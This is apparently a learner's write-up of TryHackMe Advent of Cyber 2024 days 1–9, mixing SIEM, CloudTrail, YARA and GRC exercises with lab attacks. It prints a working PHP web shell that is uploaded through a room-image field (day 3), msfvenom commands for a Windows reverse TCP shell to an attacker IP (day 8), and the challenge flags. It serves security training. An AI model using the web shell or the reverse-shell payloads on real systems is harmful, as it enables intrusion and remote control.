
# Day 1

**New Things Learnt**

* About malicious PowerShell scripts and why it is not safe to open them in a windows environment.
* Today's challenge is about OPSEC(Operational Security) failure. The user failed to remain anonymous and his details were revealed.
* The page also includes a bunch of interesting examples and instances of OPSEC fails.
* The first question can be answered by simply running the command 
```bash
exitftool song.mp3
```
from your Attack Box

* After going thru the [link](https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1) , by clicking on the username `MM-WarevilleTHM`, we can see that on his GitHub page, his most popular repo named `M.M` has his details in his README.md file. Here we get the answer to our second question, that is, his name is ***Mayor Malware***.

* On the same user profile, if we go thru his second repo, that is where the malicious script is present, and we see that this repo only has **1** commit, and that is our answer. 

# Day 2

**New Things Learnt**

* About the SOC, which is a team of IT security professionals that basically monitors a company's network and systems to prevent malicious activity from taking place.
* Now, they analyze alerts to determine if they are **F**alse **P**ositives or  **T**rue **P**ositives.
* Contacting the administrator/user is one of the best ways to analyze if the alert is real or not.

In this challenge, we're given an SIEM (Security Information and Event Management system) to analyze events that occurred between a certain timeframe.

* We notice that someone ran an encoded PowerShell command on multiple machines, and before each execution, there was a successful authentication.
	* After a lot of adding and removing filters, we get the command `SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==`, which in Base64 translates to `Install-WindowsUpdate -AcceptAll -AutoReboot`

Turns out the command was for a windows update.

Now, coming to the questions:

1. to find the name of the account causing the login attempts, we set the filters to `event.outcome: failure`, where under **user.name**, we can clearly make out the name to be **service_admin**.
using this filter, we also find the IP address of Glitch, which is the last question's answer. 
`10.0.255.1`

2. to find the number of failed login attempts, using the same filters, literally in the same page, the number is right above the graph. The number of failed attempts is **6791**.

3. To find the date of login, we set the filters 
`host.hostname: ADM-01`
`event.category: authentication` 
`event.outcome: success`

and our date comes out to be **Dec 1, 2024 08:54:39.000**.

4. And as I mentioned in the start of this write-ip, the decoded command is `Install-WindowsUpdate -AcceptAll -AutoReboot`

# Day 3

**New Things Learnt**
* Learnt about Remote Code Execution (RCE) and how it can be exploited by uploading malicious files.
* Reverse Shells and Web Shell:
A Reverse Shell starts the connection on the target, and then connects back to the attacker's system.
A Web Shell is just running on the web server.

* Learnt more about navigating thru ELK(Elasticsearch, Logstash, and Kibana) using KQL(Kibana Query Language).
* Using KQL to craft a query to filter out the logs depending on the question.

For the first question, to find out where the web shell was uploaded to, we add the filter `message: shell.php` .
We see that our directory is `/media/images/rooms/shell.php`.

Second,  the IP of the attacker is visible under the **clientip** tab in that same log. Which is **10.11.83.34**

Now, we are going to approach this challenge from an attacking point of view. As a prerequisite, we were required to add `http://frostypines.thm` in our hosts file, by modifying a file called `hosts` by going to the `etc` folder in our AttackBox. 

When we finally enter the website, we will try to look for a place where the website takes an input.
This page would be our login page, now let's refer to the provided list of common login IDs and passwords: 

![Pasted image 20241206202900](https://github.com/user-attachments/assets/3c0dd72b-e958-470b-8aa9-747ed5be2c51)


and sure enough, `admin@frostypines.thm` as the email and admin as the password works perfectly.

Now that we're in the website, we need to find a place that takes in a file upload, and that would be when we try to add a new room. Here there's a file upload in the form of a room image. Now we need a script.

Going to `sublime` on our desktop and pasting in the code already provided on THM:

```html
```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

I saved the file as `room.php`, and uploaded it under the room image upload section.

Now, we need to find where the web shell script is being executed by our server. To do this, I hit `F12` and went to the network tab and it's right there. Furthermore, we see that the file header for this is `http://frostypines.thm/media/images/room.php`.  By modifying the domain name to this, we finally get access to our web shell. 

Finally, to get the contents of `flag.txt`, we use simple Linux commands like `ls` to list the directories and then `cat flag.txt` to view the contents, which was `THM{Gl1tch_Was_H3r3}`.


# Day 4

**New Things Learnt**
* Basic understanding of what a cyber kill chain is.
* Basic understanding of MITRE ATT&CK technique [T1566.001](https://attack.mitre.org/techniques/T1566/001/).
* We're going to try to trace how the attacker must have gotten in by simply emulating the same attack to look for any traces he must've left behind.
* About Sigma Rules:
	-*They're created with **YAML syntax**, which is a human-readable and easy-to-implement format.
	-Provides a universal language for writing rules that can be shared and used across various scenes. We can write a rule once and convert it to our desired theme.
	



After entering the commands in PowerShell for both test cases, one that returns "all pre-requisites are met" and the other that returns "Microsoft Words needs to be installed", We can now navigate to the temp directory by using the shortcut Win+R, and then entering `%temp%`.

Here, we find the files


![Pasted image 20241207080332](https://github.com/user-attachments/assets/063029f7-4737-4a5e-8849-023e51ec8f94)


and inside the text file **PhishingAttachment.txt**, we find the answer for the first question, which is the flag **THM{GlitchTestingForSpearphishing}**.

Now, we clean up the logs.

For the second question, we're supposed to find out what technique ID would be our point of interest. In the last lines of the page, we're told that the run will take advantage of  **a command and scripting interpreter**, so I googled this and came across [this](https://attack.mitre.org/techniques/T1059/) page, where the technique ID is clearly mentioned to be **T1059**. 

Third question is where we find out the subtechnique ID that focuses on Windows Command Shell.
A quick google search led me this [this](https://attack.mitre.org/techniques/T1059/003/) page, where our answer is **T1059.003** .

The fourth question requires us to run the PowerShell command 

```powershell
Invoke-AtomicTest T1059.003 -ShowDetails
```

as **T1059.003** is the name of our test to be simulated. Then, next to **Atomic Test Name**, we see that the name of the attack is **Simulate BlackByte Ransomware Print Bombing**.

In the same PowerShell tab, under **Attack Commands**, we see that the file we're using is **Wareville_Ransomware.txt**, which is the answer to the fifth question.

Now, for the final question, to find the flag found from the given atomic test, we give another PowerShell command 

```powershell
Invoke-AtomicTest T1059.003 
```

Now, the test successfully executes and creates multiple bash scripts, and creates a PDF and prompts us to name it. Once we have named it, opening the PDF gives us the flag, which is 
`THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}`.

btw, the contents of the flag is encoded in Base64, which when decoded translates to "Glitch is not the enemy".

# Day 5

**New Things Learnt**

* Understanding basic XML and XXE (XML External Entity).
* Understanding DTD, which is a set of rules set in place that defines the structure of an XML document. 

In this challenge, we're going to learn what is, and how to exploit an XXE vulnerability. 

First, let us open us BurpSuite to intercept our requests. Once we have set up, it looks like this 
![Pasted image 20241207102929](https://github.com/user-attachments/assets/707e178a-6395-4704-8eab-4c1fb67cada5)


Now that we have our interceptor in place, we can go interact with the website. 

In our AttackBox, we go enter our generated server that now leads us to 
![Pasted image 20241207102319](https://github.com/user-attachments/assets/b5d8ccf8-c7c1-4d77-b7b3-9fbec5ab4b4a)

When we click on "View", we see this being generated in our BurpSuite

![Pasted image 20241207103236](https://github.com/user-attachments/assets/644f6c72-d3f8-4240-9057-e137daad4c08)


 We shall send this to repeater by using **Ctrl+R**, then we see this page 
 ![Pasted image 20241207103404](https://github.com/user-attachments/assets/59197f2a-9ae6-45d9-8bc5-4ae3094f7d78)


and from here we basically just go to "Cart", and then "Proceed to Checkout", Fill in a name and an address, and we arrive at this screen

![Pasted image 20241207103728](https://github.com/user-attachments/assets/80fa0493-0a0b-45d5-9ede-506c88168b8d)


By clicking on the blue-highlighted "Wish #21", we see an HTML page stating "only elves can see other's wishes.".
Not for long tho.


Now, back to BurpSuite, we see this interesting XML structure in our 2nd request:
![Pasted image 20241207103928](https://github.com/user-attachments/assets/04ebb5e0-b128-4129-8ae8-e99faa647bc8)


Now, I'm going to use the same XXE payload that is provided on the website, i.e 
![Pasted image 20241207104137](https://github.com/user-attachments/assets/87e54b07-1545-4939-8ade-fdc8f5471ef2)


And once we hit the orange "Send" button, we see that we can, in fact, see everyone's wishes. 
From here we just start an intruder attack in order to find the flag for our first question., with these parameters:

![Pasted image 20241207104330](https://github.com/user-attachments/assets/0921707b-68ea-4e1f-b955-cf180653b000)


Once, our results arrive, we simply scroll thru them and on the 15th request, we get the flag under the response tab.

![Pasted image 20241207104441](https://github.com/user-attachments/assets/d0bc7c5d-2767-45b9-9fac-102ae0a9fc13)

1. The acquired flag is `THM{Brut3f0rc1n6_mY_w4y}`

2. Now, to access the other flag, I read in the XXE article that websites often leave changelogs vulnerable and they can be accessed since we already used an XXE payload, and sure enough:

![Pasted image 20241207105125](https://github.com/user-attachments/assets/0ccc1c9d-c8ca-4065-9c34-4f4abbdf86c7)

Our second and last flag is `THM{m4y0r_m4lw4r3_b4ckd00rs}`


# Day 6

**New Things Learnt**

* Fundamentals of using sandbox tools.
* Using YARA rules to detect malicious patterns.
* Learning about techniques to prevent malware.

*What is a Sandbox?*
A sandbox is an isolated environment where any type of code, be it malicious, can be executed without affecting the actual system. 

Firstly, we go to **Regedit** simply searching it up or using **Win+R**, and then typing it in.

Now we're introduced to **YARA**. 
Yara is basically a tool that is used to identify and classify malware based on patterns in it's code using rules and characteristics that can be traced. 

After loading up our Virtual Machine, we follow their instructions by going to PowerShell and entering the commands
```powershell
cd C:\Tools
.\JingleBells.ps1
```

While keeping this tab open, we navigate to C:\Tools\Malware and execute **MerryChirstmas.exe**. 
If we did everything correctly, our script gets executed and we should get a pop-up with the flag

![Pasted image 20241207112222](https://github.com/user-attachments/assets/6db1f7fd-ef24-42d9-82c7-81620d5fe6dd)

1. Our flag is `THM{GlitchWasHere}`

Now, we shall try out Floss, which is a tool that is optimized to extract strings from malware binaries.
Our PowerShell command this time (after `cd`ing to C:\Tools\Floss) is 
```powershell
floss.exe C:\Tools\Malware\MerryChristmas.exe |Out-file C:\tools\malstrings.txt
```

Here:
`floss.exe C:\Tools\Malware\MerryChristmas.exe` scans for binaries in the malicious .exe file. Floss will find them if any exist.
`Out-file C:\tools\malstrings.txt` is basically used to save the results in a file called `malstrings.txt`

Our output should look like this:
![Pasted image 20241207112908](https://github.com/user-attachments/assets/3d2a8ea9-536b-4506-9ee5-2a299954efc1)

Now, all we have to do is go to the `malstrings.txt` file and **Ctrl+F**  and enter "THM" as a query to find our flag.

![Pasted image 20241207113054](https://github.com/user-attachments/assets/c358bda7-1816-4704-b2c5-39d18a26970f)

2. Our flag is `THM{HiddenClue}`.



# Day 7

**New Things Learnt**
* Today's challenge is based on AWS(Amazon Web Services), which is a cloud computing platform that offers a large number of services including computing, storage, content delivery, databases, analytics and more.
* Learnt about CloudWatch, which is a centralized AWS observability service that provides systematics, logs and alarms.
* Learnt about **JQ**, which is a command line tool that transforms and filters logs of JSON data into meaningful data to gain security insights.


For this challenge, following the instructions for the most part is learning basic commands of how to filter out JSON logs, but one command in particular gives us the answer to the first two questions.

![Pasted image 20241208095316](https://github.com/user-attachments/assets/021c05f6-4720-46c5-b8e7-c0b98ae9db2f)


1. The other activity is `PutObject`.
2. The source IP addresses related to the activities is `53.94.201.69`.

To continue the investigation, we shall input our second command which shows the events that took place and their source as well as an event key.
The command (provided in the THM room) is 
```bash
jq -r '["Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"],(.Records[] | select(.userIdentity.userName == "glitch") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```


![Pasted image 20241208095749](https://github.com/user-attachments/assets/6e75c58e-550c-4032-8c73-e8f4f292ba95)


3. The AWS service generating the ConsoleLogin event is `signin.amazonaws.com `
4. The ConsoleLogin event was trigged at the time `2024-11-28T15:21:54Z`
and the obvious answer to 
5. The name of user created by **mcskidy** is `glitch`

Now, to find out what access was awarded, we're going to enter in the command 
```bash
jq '.Records[] | select(.eventSource=="iam.amazonaws.com" and .eventName== "AttachUserPolicy")' cloudtrail_log.json
```

to show information about the assignment of the privilege under the event name "AttachUserPolicy".

![Pasted image 20241208100911](https://github.com/user-attachments/assets/879d062c-2632-46b9-a694-fa86ea3cf8ce)


6. glitch was assigned `AdministratorAccess`

Now, to find the IP that `mayor_malware` used, we use the command
```bash
jq -r '["Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"], (.Records[] | select(.sourceIPAddress=="53.94.201.69") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```

which extracts information related to the events along with IPs and in a readable format.

![Pasted image 20241208101204](https://github.com/user-attachments/assets/782e676c-ee50-40fd-aec8-912fee013fb2)


as we can see,


7. `mayor_malware` has the same IP has `mcskidy`, which is `53.94.201.69`.

Now that we know `mayor_malware` was impersonating `mcskidy` to perform his malicious activities, `mcskidy`'s actual IP can be found using the command 
```bash
jq -r '["Event_Time","Event_Source","Event_Name", "User_Name","User_Agent","Source_IP"],(.Records[] | select(.userIdentity.userName=="PLACEHOLDER") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A",.userAgent // "N/A",.sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```

but we replace "PLACEHOLDER" with mcskidy and we're shown this

![Pasted image 20241208101506](https://github.com/user-attachments/assets/f8e2f39b-bdb0-4a6a-ab18-89a241811afb)


Clearly,


8. `mcskidy`'s IP turns out to be `31.210.15.79`.

Now that we know it's him, to find out the bank account number that he has transferred all the funds to, we're gonna use the command 

```bash
grep INSERT rds.log
```

to look(or `grep`) for the word "INSERT" from the logs to extract information about this.

![Pasted image 20241208101830](https://github.com/user-attachments/assets/bebf8749-e556-425b-baef-eb01effe5ee1)


The first few transactions are to the right bank account, but towards the bottom we see that they have been meddled with and now lead to `mayor_malware`'s bank account number which is 

9. `2394 6912 7723 1294`

# Day 8

**New Things Learnt**
* **ShellCode**: A piece of code that's used by attackers to sneak in exploits such as buffer overflows to inject commands into a vulnerable system. ShellCode is typically written in Assembly.
* **Windows API** (Windows Application Programming Interface) allows programs to interact with the OS, giving them access to essential system level functions such as memory management and file operations. They act as a bridge b/w the application and the OS.

As usual, we follow some instructions and end up in a terminal with the command 

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell
```

where **ATTACKBOX_IP** is obviously our own unique AttackBox IP.

In this case, we're creating a reverse shell for a windows machine, by following a bunch of instructions. 

Now, coming to the question, we're going to follow the same instructions but with a different port `4444` 

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.194.154 LPORT=4444 -f powershell
```

After we gain remote access to the Virtual Machine, all we have to do is use the provided command `type C:\Users\glitch\Desktop\flag.txt` and we should see this

![Pasted image 20241208230449](https://github.com/user-attachments/assets/2f60190e-25f0-431d-af10-94a7ca9044ef)


 1. The flag is `AOC{GOT_MY_ACCESS_B@CK007}`


# Day 9

**New Things Learnt**
* Introduction to GRC (Governance, Risk and Compliance) is an organizational strategy to manage governance and risks while maintaining compliance with industry and government regulations.
* Basic Risk Assessment: **Identification of Risks**, ﻿**Assigning Likelihood to Each Risk**, **Assigning Impact to Each Risk**, **Risk Ownership**, 

After reading through all the challenge, I understood most of the methodology around GRC, and faced some questions 

Vendor 1:
![Pasted image 20241209234329](https://github.com/user-attachments/assets/767eec6c-5156-4cd9-8e7c-4d39380399f2)

![Pasted image 20241209234652](https://github.com/user-attachments/assets/4fb67e4a-a7e8-4458-ad9f-98c1519f86c5)

![Pasted image 20241209234845](https://github.com/user-attachments/assets/2d950574-631a-4144-a8f4-1b2e7dd99791)


Vendor 2:

![Pasted image 20241209235102](https://github.com/user-attachments/assets/ae99fed9-d111-4ee3-a078-b38dcdaa424d)


![Pasted image 20241209235201](https://github.com/user-attachments/assets/69fc09fd-e9d2-401b-986e-a95d0a3d0519)

![Pasted image 20241209235310](https://github.com/user-attachments/assets/936ce858-864d-4561-bd02-076426620a76)


Vendor 3:

![Pasted image 20241209235415](https://github.com/user-attachments/assets/2b999de5-d4fa-41eb-a84c-a6df4a7aec02)

![Pasted image 20241209235515](https://github.com/user-attachments/assets/f3b7cac9-1131-4ea3-bfc6-0361f320e1e0)

![Pasted image 20241209235310](https://github.com/user-attachments/assets/92bb0cdd-69f8-4941-8fda-dd3ff24fe29d)





1. Once we identify the vendor with the lowest risk, we get the flag `THM{R15K_M4N4G3D}`

2. The full form of GRC is `Governance, Risk, and Compliance`

